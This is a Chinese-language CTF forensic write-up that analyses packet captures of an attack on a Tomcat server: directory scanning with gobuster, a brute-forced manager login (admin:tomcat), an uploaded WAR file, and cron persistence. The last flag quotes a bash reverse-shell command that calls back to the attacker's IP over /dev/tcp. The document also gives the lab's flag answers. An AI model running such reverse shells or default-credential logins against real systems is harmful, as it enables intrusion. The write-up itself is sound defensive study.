# 第六章-流量特征分析-常见攻击事件Tomcat

  
  
&lt;!--more--&gt;  
## 0x00 环境分析  
```  
1、在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,通过分析扫描的行为后提交攻击者IP  flag格式：flag{ip}，如：flag{127.0.0.1}  
2、找到攻击者IP后请通过技术手段确定其所在地址 flag格式: flag{城市英文小写}  
3、哪一个端口提供对web服务器管理面板的访问？ flag格式：flag{2222}  
4、经过前面对攻击者行为的分析后,攻击者运用的工具是？ flag格式：flag{名称}  
5、攻击者拿到特定目录的线索后,想要通过暴力破解的方式登录,请通过分析流量找到攻击者登录成功的用户名和密码？ flag格式：flag{root-123}  
6、攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ flag格式：flag{114514.txt}  
7、攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ flag提示,某种任务里的信息  
```  
## 0x01  
1、在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,**通过分析扫描的行为后提交攻击者IP**  
过滤一下`http`请求，在按照`Source`排序`http.request==1`  
可以看到`14.0.0.120`这个ip请求次数很多，而且很多都是可疑请求，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406041916714.png)
`flag{14.0.0.120}`  
2、找到攻击者IP后请通过技术手段确定其所在地址  
`ip138`查询`ip`地址  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406041918206.png)
`flag{guangzhou}`  
3、哪一个端口提供对web服务器管理面板的访问？  
可以看到黑客一直在爆破`8080`端口  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406041920164.png)
所以`8080`端口便是`tomcat`的管理面板  
4、经过前面对攻击者行为的分析后,攻击者运用的工具是？  
随便点了几个黑客扫描的请求，发现其`User-Agent`中存在请求头  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406041922432.png)
`flag{gobuster}`  
5、攻击者拿到特定目录的线索后,想要通过暴力破解的方式登录,请通过分析流量找到攻击者登录成功的用户名和密码？  
黑客在爆破`tomcat`的管理面板，这里过滤请求  
`http.request.uri==&#34;/manager/html&#34; || http.response == 1`  
再按照时间排序  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406041923193.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406041924278.png)
`YWRtaW46dG9tY2F0`解密得到`admin:tomcat`  
`flag{admin-tomcat}`  
6、攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？  
看到了请求`/upload`目录  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406041927247.png)
发送了一个`JXQOZY.war`文件  
`flag{JXQOZY.war}`  
8、攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？  
题目描述是维权，所以搜索一下关键信息`/bin`  
`tcp contains &#34;/bin&#34;`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406041955338.png)
可以看到是定时任务进行了权限维持  
`flag{/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/14.0.0.120/443 0&gt;&amp;1&#39;}`  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6-tomcat/  

